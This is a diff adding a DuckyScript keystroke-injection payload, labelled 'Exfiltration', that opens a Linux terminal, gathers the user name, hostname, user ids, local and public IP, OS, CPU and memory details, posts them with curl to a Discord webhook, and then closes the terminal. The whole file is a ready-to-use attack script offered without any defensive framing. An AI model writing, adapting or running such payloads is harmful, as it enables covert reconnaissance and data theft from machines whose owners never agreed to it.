@@ -1,0 +1,15 @@
+REM Author: UNC0V3R3D
+REM Description: Collects Linux system information and sends it to a Discord webhook.
+REM Version: 1.0
+REM Category: Exfiltration
+REM Target: Linux (all distros)
+REM Requirements: Internet connection, Discord webhook URL, curl
+DELAY 1000
+CTRL ALT t
+DELAY 1500
+STRING bash -c "INFO=\"\`uname -a\`\n\`whoami\`@\`hostname\`\n\`id\`\nIP:\`hostname -I 2>/dev/null | awk '{print \$1}'\`\nPub:\`curl -s https://api.ipify.org\`\nOS:\`cat /etc/os-release 2>/dev/null | grep PRETTY | cut -d= -f2\`\nCPU:\`grep -m1 'model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2\`\nMem:\`free -h 2>/dev/null | awk '/Mem/{print \$2}'\`\"; curl -s -X POST 'DISCORD_WEBHOOK_URL' -H 'Content-Type: application/json' -d \"{\\\"content\\\":\\\"**Linux Sysinfo**\\\n\\\`\\\`\\\`\$INFO\\\`\\\`\\\`\\\"}\""
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+REM End of payload
